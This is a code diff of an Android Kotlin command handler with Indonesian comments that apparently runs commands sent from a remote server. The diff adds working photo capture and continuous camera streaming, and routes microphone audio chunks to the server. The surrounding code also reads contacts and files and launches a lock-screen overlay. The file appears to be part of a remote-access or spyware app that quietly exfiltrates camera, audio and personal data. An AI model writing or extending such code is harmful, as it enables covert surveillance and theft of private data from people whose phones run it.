@@ -5,7 +5,6 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
-import android.graphics.BitmapFactory
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
 import android.media.MediaPlayer
@@ -15,6 +14,7 @@ import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
 import android.provider.Settings
+import android.util.Base64
 import android.util.Log
 import org.json.JSONArray
 import org.json.JSONObject
@@ -100,17 +100,9 @@ object NativeCommandHandler {
                 "stop_audio_stream" -> stopAudioStream()
 
                 // ===== CAMERA =====
-                "take_photo" -> JSONObject().apply {
-                    put("ok", false)
-                    put("error", "camera_requires_activity")
-                }
-                "start_camera_stream" -> JSONObject().apply {
-                    put("ok", false)
-                    put("error", "camera_requires_activity")
-                }
-                "stop_camera_stream" -> JSONObject().apply {
-                    put("ok", true)
-                }
+                "take_photo" -> takePhotoReal(context, extra)
+                "start_camera_stream" -> startCameraStreamReal(context, extra)
+                "stop_camera_stream" -> stopCameraStreamReal(context)
 
                 // ===== CONTACTS =====
                 "get_contacts" -> getContacts(context)
@@ -316,9 +308,6 @@ object NativeCommandHandler {
             Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
             Log.d(TAG, "   volume:  $volume")
 
-            // ==========================================
-            // ===== LAUNCH OVERLAY =====
-            // ==========================================
             val intent = Intent(context, LockOverlayActivity::class.java).apply {
                 addFlags(
                     Intent.FLAG_ACTIVITY_NEW_TASK or
@@ -635,7 +624,7 @@ object NativeCommandHandler {
             }
 
             val bytes = file.readBytes()
-            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
 
             JSONObject().apply {
                 put("ok", true)
@@ -758,10 +747,13 @@ object NativeCommandHandler {
     private fun startAudioStream(): JSONObject {
         return try {
             val ok = AudioStreamService.start { chunk ->
-                // Chunk audio — kirim ke server via HTTP/SSE
-                // Callback di-handle oleh service utama
+                // Kirim chunk audio ke server via ConnectionService
+                ConnectionService.sendAudioFrame(chunk)
             }
-            JSONObject().apply { put("ok", ok) }
+            JSONObject().apply {
+                put("ok", ok)
+                put("streaming", ok)
+            }
         } catch (e: Exception) {
             JSONObject().apply {
                 put("ok", false)
@@ -776,6 +768,89 @@ object NativeCommandHandler {
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply { put("ok", true) }
+        }
+    }
+
+    // ==========================================
+    // ===== CAMERA =====
+    // ==========================================
+    private fun takePhotoReal(context: Context, extra: String): JSONObject {
+        return try {
+            val facing = extra.ifEmpty { "back" }
+
+            Log.d(TAG, "📸 Taking photo (facing=$facing)")
+
+            CameraStreamService.takePhoto(context, facing) { base64, error ->
+                // Callback async — kirim via ConnectionService
+                val result = JSONObject().apply {
+                    if (error != null) {
+                        put("ok", false)
+                        put("error", error)
+                    } else {
+                        put("ok", true)
+                        put("image_base64", base64 ?: "")
+                        put("size", base64?.length ?: 0)
+                    }
+                }
+                ConnectionService.sendCommandResponse("take_photo", result)
+            }
+
+            JSONObject().apply {
+                put("ok", true)
+                put("message", "photo_capture_initiated")
+                put("async", true)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "photo_error")
+            }
+        }
+    }
+
+    private fun startCameraStreamReal(context: Context, extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val facing = parts.getOrNull(0)?.ifEmpty { "back" } ?: "back"
+            val interval = parts.getOrNull(1)?.toLongOrNull() ?: 200L
+
+            Log.d(TAG, "📷 Starting camera stream (facing=$facing, interval=$interval)")
+
+            val ok = CameraStreamService.start(
+                context = context,
+                facing = facing,
+                intervalMs = interval,
+                frameCallback = { base64 ->
+                    // Kirim frame ke server
+                    ConnectionService.sendCameraFrame(base64)
+                },
+                errorCallback = { error ->
+                    Log.e(TAG, "Camera stream error: $error")
+                },
+            )
+
+            JSONObject().apply {
+                put("ok", ok)
+                put("facing", facing)
+                put("interval", interval)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "stream_error")
+            }
+        }
+    }
+
+    private fun stopCameraStreamReal(context: Context): JSONObject {
+        return try {
+            CameraStreamService.stop(context)
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "stop_error")
+            }
         }
     }
 
